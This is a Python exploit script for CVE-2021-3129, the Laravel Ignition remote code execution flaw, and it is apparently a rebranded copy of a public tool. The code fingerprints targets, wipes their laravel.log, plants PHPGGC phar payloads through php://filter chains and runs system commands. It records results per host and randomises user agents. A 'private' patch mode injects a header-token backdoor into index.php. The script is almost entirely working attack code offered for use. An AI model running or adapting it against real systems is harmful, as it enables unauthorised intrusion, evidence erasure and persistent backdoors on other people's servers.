import argparse
import random
import sys

import requests
import os
import base64
import zipfile
import stat
import pkg_resources
import re
import subprocess
import readline
import json
import shutil
import uuid
from urllib.parse import urlparse


PURPLE = "\033[95m"
CYAN = "\033[96m"
DARKCYAN = "\033[36m"
BLUE = "\033[94m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
BOLD = "\033[1m"
UNDERLINE = "\033[4m"
END = "\033[0m"


CHAINS = [
    "laravel/rce1",
    "laravel/rce2",
    "laravel/rce3",
    "laravel/rce4",
    "laravel/rce7",
    "laravel/rce8",
    "laravel/rce9",
    "laravel/rce10",
    "laravel/rce11",
    "laravel/rce12",
    "laravel/rce13",
    "laravel/rce14",
    "laravel/rce15",
    "laravel/rce16",
    "monolog/rce1",
    "monolog/rce2",
    "monolog/rce3",
    "monolog/rce5",
    "monolog/rce6",
    "monolog/rce7",
    "monolog/rce8",
    "monolog/rce9",
]

USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134",
    "Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
]


class Main:
    def __init__(
        self,
        host,
        force=False,
        log_path=None,
        useragent=False,
        chain=None,
        php_executable="php",
        private_key="",
        no_cache=False,
    ):
        self.host = host
        self.force = force
        self.log_path = log_path
        self.useragent = self.random_useragent() if useragent else "Python"
        self.chain = chain
        self.php_executable = php_executable
        self.no_cache = no_cache
        self.private_key = (
            private_key if private_key != "" else self.get_cache("private_key")
        )
        self.session = requests.session()
        self.root_path = None
        self.operating_system = None
        self.is_patched = False
        self.last_used_chain = None

        # Check for previous working chains
        previous_chain = self.get_cache("working_chain")
        if chain == None and self.get_cache("working_chain") != "":
            use_chain = "y"
            if use_chain == "y" or use_chain == "yes":
                self.chain = self.get_cache("working_chain")

        self.start()

    def start(self):
        print(f'{DARKCYAN}[@] Starting exploit on "{CYAN}{self.host}{DARKCYAN}"...')

        # Check if vulnerable
        if not self.is_vulnerable():
            print(
                f'{RED}[!] Host does not seem to be vulnerable. Use parameter "--force" to bypass this check.'
            )
            exit()

        # Ask user interaction
        print(PURPLE + '[•] Use "?" for a list of all possible actions.')
        self.ask_command()

    def ask_command(self):
        #  response      = "id"
        # response_list = response.split(" ",1)
        # command       = response_list[0].lower()

        payload = "id"
        # if(len(response_list) == 2):
        #   payload = response_list[1]

        # if command == "?" or command == "help":  # Return list of commands
        #  self.cmd_help()
        # elif command == "exit":  # Stop script
        #   exit()
        # elif command == "clear_logs":  # Attempt to clear laravel.log of target
        self.cmd_clear_logs()
        # elif command == "execute":  # Attempt to execute system command on target
        self.cmd_execute_cmd(payload)
        # elif command == "write":  # Attempt to write to the log file of target
        #    self.cmd_execute_write(payload)
        # elif command == "patch":  # Attempt to patch the vulnerability on the target
        #    self.cmd_execute_patch(payload)
        # elif command == "patches":  # Attempt to patch the vulnerability on the target
        #    self.cmd_execute_patch_details()
        # elif command == "":
        #    print(f"{RED}[!] Please enter a command.")
        # else:
        #  print(f"{RED}[!] No command found named \"{command}\".")

        self.ask_command()

    def cmd_help(self):
        print(f"{BLUE}[•] Available commands:")
        print(f"{DARKCYAN}    exit                       {CYAN}-  Exit program.")
        print(
            f"{DARKCYAN}    help                       {CYAN}-  Shows available commands."
        )
        print(f"{DARKCYAN}    clear_logs                 {CYAN}-  Clears Laravel logs.")
        print(
            f"{DARKCYAN}    execute <command>          {CYAN}-  Execute system command."
        )
        print(f"{DARKCYAN}    write <text>               {CYAN}-  Write to log file.")
        print(
            f"{DARKCYAN}    patch <env/index/private>  {CYAN}-  Patch the vulnerability."
        )
        print(
            f"{DARKCYAN}    patches                    {CYAN}-  Detailed information about patch modes"
        )

    def cmd_clear_logs(self):
        print(f"{DARKCYAN}[@] Clearing Laravel logs...")
        self.exploit_clear_logs()
        if not self.force:
            print(f"{GREEN}[√] Cleared Laravel logs!")

    def cmd_execute_cmd(self, cmd: str, ignore_specials=False, output_success=True):
        while cmd == "":
            cmd = input(f"{PURPLE}[?] Enter the command to execute {DARKCYAN}: ")

        print(f'{DARKCYAN}[@] Executing command "{cmd}"...')
        payloads = self.generate_payload(
            command=cmd, padding=16, ignore_specials=ignore_specials
        )

        i = 0
        for payload in payloads:
            i = i + 1
            self.last_used_chain = payload["name"]
            print(
                f"{PURPLE}[@] Trying chain {payload['name']} [{i}/{len(payloads)}]..."
            )

            self.exploit_execute(payload["data"], output_success)

            if i < len(payloads):
                 next_chain = "y"
                 if next_chain == "y" or next_chain == "yes":
                  continue
                 else:
                   break

    def cmd_execute_patch_details(self):
        print(
            f'{BLUE}[•] Different patch modes for "patch <env/index/private>" command:\n'
            f"{DARKCYAN}    env      {CYAN}-  Updates the .env file so that APP_DEBUG will be set from 'true' to 'false'\n"
            f"{DARKCYAN}    index    {CYAN}-  Injects code into index.php which prevents access to '/_ignition/execute-solution'\n"
            f"{DARKCYAN}    private  {CYAN}-  Same as the 'index' mode but generates a private header key, so you can still access the vulnerability"
        )

    def cmd_execute_patch(self, mode: str):
        if self.chain == None:
            print(
                YELLOW
                + "[!] To use this feature please find a working chain using 'execute' function or use the '--chain' command argument."
            )
            return

        mode = mode.lower()
        while (mode != "env" and mode != "index" and mode != "private") or mode == "":
            mode = input(
                f"{PURPLE}[?] Enter the patch mode to use <env/index/private> {DARKCYAN}: "
            )

        print(
            f'{DARKCYAN}[@] Attempting to patch Laravel application with "{mode}" mode...'
        )
        private_key = str(uuid.uuid4())
        index_patch = base64.b64encode(
            'if(isset($_SERVER["REQUEST_URI"]) && strtolower($_SERVER["REQUEST_URI"]) == "/_ignition/execute-solution") { http_response_code(403); echo "<h1>Exploit patched</h1><!-- This exploit has been patched with https://github.com/joshuavanderpoll/CVE-2021-3129 -->"; exit(); }'.encode(
                "utf-8"
            )
        ).decode("utf-8")
        private_patch = base64.b64encode(
            (
                'if(isset($_SERVER["REQUEST_URI"]) && strtolower($_SERVER["REQUEST_URI"]) == "/_ignition/execute-solution") {if(!isset($_SERVER["HTTP_X_BYPASS_TOKEN"]) || $_SERVER["HTTP_X_BYPASS_TOKEN"] != "'
                + private_key
                + '") {http_response_code(403);echo "<h1>Exploit patched</h1><!-- This exploit has been patched with https://github.com/joshuavanderpoll/CVE-2021-3129 -->";exit();}}'
            ).encode("utf-8")
        ).decode("utf-8")

        # Setup needed paths for commands
        patch_path = (
            f"{self.root_path}\\\\public\\\\patch.php"
            if self.operating_system == "windows"
            else f"{self.root_path}/public/patch.php"
        )
        env_path = (
            f"{self.root_path}\\\\.env"
            if self.operating_system == "windows"
            else f"{self.root_path}/.env"
        )
        index_path = (
            f"{self.root_path}\\\\public\\\\index.php"
            if self.operating_system == "windows"
            else f"{self.root_path}/public/index.php"
        )

        # Prevent double patch input
        execute_patch = True
        if self.is_patched and (mode == "index" or mode == "private"):
            continue_patch = input(
                YELLOW
                + "[!] This host seems to be patched already. Patching again with the selected mode can break the host. Are you sure to continue? [Y/N] : "
            )
            if continue_patch.lower() != "y" and continue_patch.lower() != "yes":
                execute_patch = False

        if not execute_patch:
            print(YELLOW + "[!] Aborted patch")
            return

        patch_command = None
        if (
            mode == "env"
        ):  # Updates the .env file so that APP_DEBUG will be set from 'true' to 'false'
            patch_command = f'echo "<?php file_put_contents(\\"{env_path}\\", preg_replace(\\"/APP_DEBUG.*=.*[Tt][Rr][Uu][Ee]/i\\", \\"APP_DEBUG=false\\", file_get_contents(\\"{env_path}\\"))); unlink(\\"{patch_path}\\"); ?>" > "{patch_path}"'

        elif (
            mode == "index"
        ):  # Injects code into index.php which prevents access to '/_ignition/execute-solution'
            patch_command = f'echo "<?php file_put_contents(\\"{index_path}\\", str_replace(\\"<?php\\", \\"<?php\\".PHP_EOL.base64_decode(\\"{index_patch}\\").PHP_EOL, file_get_contents(\\"{index_path}\\"))); unlink(\\"{patch_path}\\"); ?>" > "{patch_path}"'

        elif (
            mode == "private"
        ):  # Same as the 'index' mode but generates a private header key, so you can still access the vulnerability
            self.private_key = private_key
            self.cache_data("private_key", self.private_key)
            print(f'{GREEN}[√] Your "X-BYPASS-TOKEN" key is: "{self.private_key}".')

            patch_command = f'echo "<?php file_put_contents(\\"{index_path}\\", str_replace(\\"<?php\\", \\"<?php\\".PHP_EOL.base64_decode(\\"{private_patch}\\").PHP_EOL, file_get_contents(\\"{index_path}\\"))); unlink(\\"{patch_path}\\"); ?>" > "{patch_path}"'

        if patch_command == None:
            print(f"{RED}[!] Failed generating patching payload.")
            return

        # Send patch command
        self.cmd_execute_cmd(patch_command, True, False)

        # Set headers
        headers = {"User-Agent": self.useragent}
        if self.private_key != "":
            headers["X-BYPASS-TOKEN"] = self.private_key

        request = self.session.get(
            url=f"{self.host}patch.php", verify=False, headers=headers
        )
        if request.status_code == 200:
            self.is_patched = True
            print(f"{GREEN}[√] Patch seems to be deployed.")
        else:
            print(f"{RED}[!] Patch seems to have failed.")

    def cmd_execute_write(self, text: str, path=None):
        while text == "":
            text = input(f"{PURPLE}[?] Enter the text to write {DARKCYAN}: ")

        print(f'{DARKCYAN}[@] Writing to log file: "{text}"...')
        payload = self.generate_write_payload(text, 16)

        print(
            f"{BLUE}[@] Clearing logs..."
        )  # Step 1. Clear logs to prevent old payloads executing.
        self.exploit_clear_logs()

        print(
            f"{BLUE}[@] Causing error in logs..."
        )  # Step 2. Cause a error to write phar file.
        if self.exploit_cause_error().status_code != 500:
            print(f"{RED}[!] Failed causing error.")
            return
        print(f"{GREEN}[√] Caused error in logs.")

        print(
            f"{BLUE}[@] Sending payload..."
        )  # Step 3. Cause error with payload so payload in log file.
        if self.exploit_request(payload, 500).status_code != 500:
            print(f"{RED}[!] Failed sending payload.")
            return
        print(f"{GREEN}[√] Sent payload.")

        print(
            f"{BLUE}[@] Converting payload..."
        )  # Step 4. Change te log file into the payload in the log file.
        path = path if path != None else self.log_path

        if (
            self.exploit_request(
                f"php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource={path}",
                200,
            ).status_code
            != 200
        ):
            print(f"{RED}[!] Failed converting payload.")
            return
        print(f"{GREEN}[√] Converted payload.")

    def cache_data(self, key: str, value):
        if self.no_cache:
            return

        if not os.path.exists(".cache"):
            os.mkdir(".cache")

        parsed_host = urlparse(self.host)
        file_name = re.sub("[^A-Za-z0-9]+", "", parsed_host.netloc) + ".json"
        file_path = os.path.join(".cache", file_name)

        file_contents = {}
        if not os.path.exists(file_path):
            with open(file_path, "w") as f:
                f.write("{}")
        else:
            with open(file_path, "r") as f:
                file_contents = json.loads(f.read())

        file_contents[key] = value

        with open(file_path, "w") as f:
            f.write(json.dumps(file_contents, indent=4))

    def get_cache(self, key: str):
        if self.no_cache:
            return ""

        file_contents = ""
        if not os.path.exists(".cache"):
            return file_contents

        parsed_host = urlparse(self.host)
        file_name = re.sub("[^A-Za-z0-9]+", "", parsed_host.netloc) + ".json"
        file_path = os.path.join(".cache", file_name)

        if os.path.exists(file_path):
            with open(file_path, "r") as f:
                json_conents = json.loads(f.read())
                if key in json_conents:
                    file_contents = json_conents[key]

        return file_contents

    def exploit_clear_logs(self) -> requests.Response:  # Clear entire log file
        return self.exploit_request(
            f"php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource={self.log_path}",
            200,
            True,
        )
        # return self.exploit_request(f"php://filter/read=consumed/resource={self.log_path}", 200)

    def exploit_cause_error(
        self,
    ) -> requests.Response:  # Cause error by sending path parameter
        return self.exploit_request("AA", 500)

    def exploit_execute(self, payload: str, output_success=True):
        success = True
        print(
            f"{BLUE}[@] Clearing logs..."
        )  # Step 1. Clear logs to prevent old payloads executing.
        self.exploit_clear_logs()

        print(
            f"{BLUE}[@] Causing error in logs..."
        )  # Step 2. Cause a error to write phar file.
        if self.exploit_cause_error().status_code != 500:
            print(f"{RED}[!] Failed causing error.")
            self.exploit_clear_logs()
            success = False
        else:
            print(f"{GREEN}[√] Caused error in logs.")

        print(f"{BLUE}[@] Sending payloads...")

        if (
            self.exploit_request(payload, 500).status_code != 500
        ):  # Step 3. Cause error with payload so payload in log file.
            print(f"{RED}[!] Failed sending payload.")
            self.exploit_clear_logs()
            success = False
        else:
            print(f"{GREEN}[√] Sent payload.")

        print(
            f"{BLUE}[@] Converting payload..."
        )  # Step 4. Change te log file into the payload in the log file.
        if (
            self.exploit_request(
                f"php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource={self.log_path}",
                200,
            ).status_code
            != 200
        ):
            print(f"{RED}[!] Failed converting payload.")
            self.exploit_clear_logs()
            success = False
        else:
            print(f"{GREEN}[√] Converted payload.")

        exploited = self.exploit_request(
            f"phar://{self.log_path}", 500
        )  # Step 5. Let host execute phar script.
        if exploited.status_code == 500 and "cannot be empty" in exploited.text:
            if output_success:
                print(f"{GREEN}[√] Result:")
                result = exploited.text.split("</html>")[1]
                print(END + result)
                f = open("result.txt", "a")
                f.write(self.host + result)
                f.close()
                exit()
                
                if self.chain == None:
                    print(
                        f"{GREEN}[√] Working chain found. You have now access to the 'patch' functionality."
                    )
                    self.chain = self.last_used_chain
                    self.cache_data("working_chain", self.chain)
        else:
            error_search = r"<title>🧨 (.*?)<\/title>"
            error_result = re.search(error_search, exploited.text)
            if error_result:
                print(
                    f'{RED}[!] Failed execution of payload.\nError: "{error_result[1]}".'
                )
                success = False
            else:
                print(f"{RED}[!] Failed execution of payload.")
                success = False

        self.exploit_clear_logs()
        self.exploit_clear_logs()
           
        return success 

    def random_useragent(self) -> str:  # Get random user agent from constant list
        return random.choice(USER_AGENTS)

    def setup_phpggc(self):
        zip_path = "./master_phpggc.zip"
        print(
            f'{BLUE}[@] Downloading PHPGGC from "ambionics/phpggc" GitHub repository...'
        )

        # Download repository zip
        request = self.session.get(
            "https://github.com/ambionics/phpggc/archive/refs/heads/master.zip",
            verify=False,
            allow_redirects=True,
            headers={"User-Agent": self.useragent},
        )
        open(zip_path, "wb").write(request.content)

        # Unzip zip
        with zipfile.ZipFile(zip_path, "r") as zip_ref:
            zip_ref.extractall("./")
        print(f"{GREEN}[√] Downloaded/extracted PHPGGC.")

        phpggc_path = "./phpggc-master/phpggc"

        # Setup phpggc execute permissions
        print(f"{BLUE}[@] Updating PHPGGC execution permissions...")
        if os.path.exists(phpggc_path):
            st = os.stat(phpggc_path)
            os.chmod(phpggc_path, st.st_mode | stat.S_IEXEC)
        print(f"{GREEN}[√] Updated PHPGGC execution permissions.")

        # Remove extracted zip file
        os.unlink(zip_path)

    def generate_payload(self, command: str, padding=0, ignore_specials=False) -> list:
        payloads = []
        print(f"{DARKCYAN}[@] Generating payload...")

        # Prepare command
        if not ignore_specials:
            if "/" in command:
                command = command.replace("/", "\/")
                command = command.replace("'", "\\'")

            if "'" in command:
                command = command.replace("'", "'")

        try:
            subprocess.run(
                [self.php_executable, "-v"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except FileNotFoundError:
            print(
                f'{RED}[!] PHP does not seem to be installed. Please use the "--php" variable to define your PHP path.'
            )
            exit(1)

        # Check PHPGGC
        if not os.path.exists("./phpggc-master/phpggc"):
            print(f"{RED}[!] Required binary PHPGGC not found.")
            self.setup_phpggc()

        # Build payload
        if os.path.exists("./.tmp"):
            shutil.rmtree("./.tmp")
        os.mkdir("./.tmp")

        chains = CHAINS if self.chain == None else [self.chain]
        for chain in chains:
            phar_name = chain.replace("/", "-") + ".phar"
            phar_path = f"./.tmp/{phar_name}"

            os.system(
                f"{self.php_executable} -d'phar.readonly=0' ./phpggc-master/phpggc {chain} system '{command}' --phar phar -o {phar_path}"
            )

            if os.path.exists(phar_path):
                payload = open(phar_path, "rb").read()
                payload = base64.b64encode(payload).decode().rstrip("=")
                payload = "".join(c + "=00" for c in payload)
                payload = "A" * padding + payload
                payload = payload.replace("\n", "") + "A"

                payloads.append({"data": payload, "name": chain})

                # Delete temporary files
                os.unlink(phar_path)

        print(f"{GREEN}[√] Generated {len(payloads)} payloads.")
        return payloads

    def generate_write_payload(self, text: str, padding=0) -> str:
        print(f"{DARKCYAN}[@] Generating payload...")

        # Prepare/encode payload
        payload = base64.b64encode(text.encode()).decode().rstrip("=")
        payload = "".join(c + "=00" for c in payload)
        payload = "A" * padding + payload

        print(f"{GREEN}[√] Generated payload.")
        return payload

    def exploit_request(
        self, value: str, expected_response: int = 200, silent=False
    ) -> requests.Response:
        data = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {"variableName": "variable", "viewFile": value},
        }
        headers = {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "User-Agent": self.useragent,
        }
        if self.private_key != "":
            headers["X-BYPASS-TOKEN"] = self.private_key

        request = self.session.post(
            url=f"{self.host}_ignition/execute-solution",
            json=data,
            headers=headers,
            verify=False,
        )
        if request.status_code != expected_response and not silent:
            error_search = r"<title>🧨 (.*?)<\/title>"
            error_result = re.search(error_search, request.text)
            if error_result:
                print(
                    f'{RED}[!] Exploit request returned status code {request.status_code}. Expected {expected_response}.\nError: "{error_result[1]}"'
                )
            else:
                print(
                    f"{RED}[!] Exploit request returned status code {request.status_code}. Expected {expected_response}."
                )

        # Check if host has patched vulnerability
        if (
            "runnable solutions are disabled in non-local environments"
            in request.text.lower()
        ):
            print(
                f'{RED}[!] Website has patched the vulnerability. Response: "Runnable solutions are disabled in non-local environments."'
            )

        if (
            "solutions can only be executed by requests from a local ip address"
            in request.text.lower()
        ):
            print(
                f'{RED}[!] Website has patched the vulnerability. Response: "Solutions can only be executed by requests from a local IP address."'
            )

        return request

    def is_vulnerable(self):
        print(
            f'{DARKCYAN}[@] Testing vulnerable URL "{CYAN}{self.host}_ignition/execute-solution{DARKCYAN}"...'
        )

        # Set headers
        headers = {"User-Agent": self.useragent}
        if self.private_key != "":
            headers["X-BYPASS-TOKEN"] = self.private_key

        request = self.session.get(
            url=f"{self.host}_ignition/execute-solution", verify=False, headers=headers
        )

        # Check if vulnerability already patched
        attemps = 0
        while request.status_code == 403 and "Exploit patched" in request.text:
            self.is_patched = True

            if attemps > 0:
                print(f"{RED}[!] Invalid private key [{attemps}/3].")
            if attemps >= 3:
                exit(1)

            self.private_key = input(
                f"{BLUE}[?] This host has already been patched. Enter private key {DARKCYAN}: "
            )
            headers["X-BYPASS-TOKEN"] = self.private_key
            request = self.session.get(
                url=f"{self.host}_ignition/execute-solution",
                verify=False,
                headers=headers,
            )

            attemps = attemps + 1

        # Check vulnerable url by sending invalid GET request (only POST allowed)
        if request.status_code != 405:
            print(
                f'{BLUE}[•] Host returned status code "{request.status_code}". Expected 405 (Method not allowed).'
            )
            if not self.force:
                return False

        # Check if vulnerable url contains signs of Laravel
        if "laravel" not in str(request.content):
            if "405 method not allowed" in str(request.content).lower():
                print(f"{RED}[!] Host refused request method.")
            else:
                print(
                    f'{RED}[!] Host does not seems like Laravel. No "laravel" found in body.'
                )
            if not self.force:
                return False

        if not self.force:
            print(f"{GREEN}[√] Host seems vulnerable!")

        # Check if log path defined in error response
        print(f"{DARKCYAN}[@] Searching Laravel log file path...")
        self.find_log_path(content=request.content)

        if self.log_path is None:
            print(
                f'{RED}[!] No log path could be found. Please define the log path with the "--log" argument'
            )
            exit()
        else:
            print(f'{BLUE}[√] Laravel log path: "{DARKCYAN}{self.log_path}{BLUE}".')

        # Check if laravel version defined in error response
        laravel_version = self.find_laravel_version(content=request.text)
        if laravel_version is not None:
            print(
                f'{BLUE}[•] Laravel version found: "{DARKCYAN}{laravel_version}{BLUE}".'
            )

            if not self.force:
                patched_version = pkg_resources.parse_version("8.4.2")
                current_version = pkg_resources.parse_version(laravel_version)
                if current_version >= patched_version:
                    print(
                        f'{RED}[!] Host is using a patched version of Laravel. Use parameter "--force" to bypass this check.'
                    )
                    exit()

        return True

    def find_log_path(self, content):
        # Regex search for file path
        search_pattern = r"The .* supported .* in file (.*?) on line"
        search_res = re.search(search_pattern, str(content))

        if search_res:
            file_path = search_res[1]

            if "/vendor/laravel/framework" in file_path:  # Linux system
                print(
                    f"{BLUE}[•] Laravel seems to be running on a {DARKCYAN}Linux{BLUE} based machine."
                )
                self.root_path = file_path.split("/vendor/laravel/framework")[0]
                self.log_path = f"{self.root_path}/storage/logs/laravel.log"
                self.operating_system = "linux"
            if "\\\\vendor\\\\laravel\\\\framework" in file_path:  # Windows system
                print(
                    f"{BLUE}[•] Laravel seems to be running on a {DARKCYAN}Windows{BLUE} based machine."
                )
                self.root_path = file_path.split("\\\\vendor\\\\laravel\\\\framework")[
                    0
                ].replace("\\\\", "\\")
                self.log_path = f"{self.root_path}\\storage\\logs\\laravel.log"
                self.operating_system = "windows"

    def find_laravel_version(self, content: str):

        # Regex search for framework version
        search_pattern = r"\"framework_version\":\"(.*?)\""
        search_res = re.search(search_pattern, content)

        if search_res:
            return search_res[1]
        return None


def validate_url(url: str) -> bool:  # https://stackoverflow.com/a/7160778
    regex = re.compile(
        r"^(?:http)s?://"  # http:// or https://
        r"(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|"  # domain...
        r"localhost|"  # localhost...
        r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})"  # ...or ip
        r"(?::\d+)?"  # optional port
        r"(?:/?|[/?]\S+)$",
        re.IGNORECASE,
    )

    return re.match(regex, url) is not None


if __name__ == "__main__":
    # Credits
    print(
        f"{PURPLE}{BOLD}[+] Haxor Security ZeroOne[+]{END}"
    )
    print(
        f"{END}{PURPLE}[•] Using PHPGGC: {UNDERLINE}https://github.com/ambionics/phpggc{END}{RED}"
    )

    # Arguments
    parser = argparse.ArgumentParser(
        description="Exploit CVE-2021-3129 - Laravel vulnerability exploit script"
    )
    parser.add_argument("--host", help="Host URL to use exploit on", required=False)
    parser.add_argument(
        "--force",
        help="Force exploit without checking if vulnerable",
        required=False,
        default=False,
        action="store_true",
    )
    parser.add_argument(
        "--log",
        help="Full path to laravel.log file (e.g. /var/www/html/storage/logs/laravel.log)",
        required=False,
        default=None,
    )
    parser.add_argument(
        "--ua",
        help="Randomize User-Agent for requests",
        required=False,
        default=False,
        action="store_true",
    )
    parser.add_argument(
        "--chain",
        help=f'Select PHPGGC chain. Use "--chains" parameter to view all available chains.',
        required=False,
        default=None,
    )
    parser.add_argument(
        "--chains",
        help='View available chains for the "--chain" parameter',
        required=False,
        default=False,
        action="store_true",
    )
    parser.add_argument(
        "--php", help="Path to PHP executable", required=False, default="php"
    )
    parser.add_argument(
        "--private-key",
        help="Private key for patched hosts",
        required=False,
        default="",
    )
    parser.add_argument(
        "--no-cache",
        help="Do't store private patch keys and chain results",
        required=False,
        default=False,
        action="store_true",
    )

    args = parser.parse_args()

    # Chains
    if args.chains:
        print(
            f"{BLUE}[•] Available chains (Updated: August 16 2023):\n"
            f"{PURPLE}- Laravel/RCE1  (5.4.27)\n"
            f"{PURPLE}- Laravel/RCE2  (5.4.0 <= 8.6.9+)\n"
            f"{PURPLE}- Laravel/RCE3  (5.5.0 <= 5.8.35)\n"
            f"{PURPLE}- Laravel/RCE4  (5.4.0 <= 8.6.9+)\n"
            f"{PURPLE}- Laravel/RCE5  (5.8.30)\n"
            f"{PURPLE}- Laravel/RCE6  (5.5.* <= 5.8.35)\n"
            f"{PURPLE}- Laravel/RCE7  (? <= 8.16.1)\n"
            f"{PURPLE}- Laravel/RCE8  (7.0.0 <= 8.6.9+)\n"
            f"{PURPLE}- Laravel/RCE9  (5.4.0 <= 9.1.8+)\n"
            f"{PURPLE}- Laravel/RCE10 (5.6.0 <= 9.1.8+)\n"
            f"{PURPLE}- Laravel/RCE11 (5.4.0 <= 9.1.8+)\n"
            f"{PURPLE}- Laravel/RCE12 (5.8.35, 7.0.0, 9.3.10)\n"
            f"{PURPLE}- Laravel/RCE13 (5.3.0 <= 9.5.1+)\n"
            f"{PURPLE}- Laravel/RCE14 (5.3.0 <= 9.5.1+)\n"
            f"{PURPLE}- Laravel/RCE15 (5.5.0 <= v9.5.1+)\n"
            f"{PURPLE}- Laravel/RCE16 (5.6.0 <= v9.5.1+)\n"
            f"\n"
            f"{PURPLE}- Monolog/RCE1  (1.4.1 <= 1.6.0 1.17.2 <= 2.2.0+)\n"
            f"{PURPLE}- Monolog/RCE2  (1.4.1 <= 2.2.0+)\n"
            f"{PURPLE}- Monolog/RCE3  (1.1.0 <= 1.10.0)\n"
            f"{PURPLE}- Monolog/RCE4  (? <= 2.4.4+)\n"
            f"{PURPLE}- Monolog/RCE5  (1.25 <= 2.2.0+)\n"
            f"{PURPLE}- Monolog/RCE6  (1.10.0 <= 2.2.0+)\n"
            f"{PURPLE}- Monolog/RCE7  (1.10.0 <= 2.7.0+)\n"
            f"{PURPLE}- Monolog/RCE8  (3.0.0 <= 3.1.0+)\n"
            f"{PURPLE}- Monolog/RCE9  (3.0.0 <= 3.1.0+)\n"
            f"{BLUE}from: https://github.com/ambionics/phpggc#usage"
        )
        exit()

    # Validate before scan start
    if args.host is None:
        args.host = input(
            f"{BLUE}[?] Enter host (e.g. https://example.com/){DARKCYAN} : "
        )

    if args.host[-1] != "/":
        args.host = args.host + "/"

    if args.host[0:7] != "http://" and args.host[0:8] != "https://":
        args.host = f"http://{args.host}"

    if not validate_url(args.host):
        print(
            f'{RED}[!] Parameter "--host" is invalid. Please use a valid url (e.g. https://example.com/)'
        )
        exit()

    if args.chain != None and args.chain.lower() not in CHAINS:
        print(
            f'{RED}[!] Parameter "--chain" is invalid. Please check "{sys.executable} {os.path.basename(__file__)} --chains".'
        )
        exit()

    requests.packages.urllib3.disable_warnings()
    x = Main(
        host=args.host,
        force=args.force,
        log_path=args.log,
        useragent=args.ua,
        chain=args.chain,
        php_executable=args.php,
        private_key=args.private_key,
        no_cache=args.no_cache,
    )
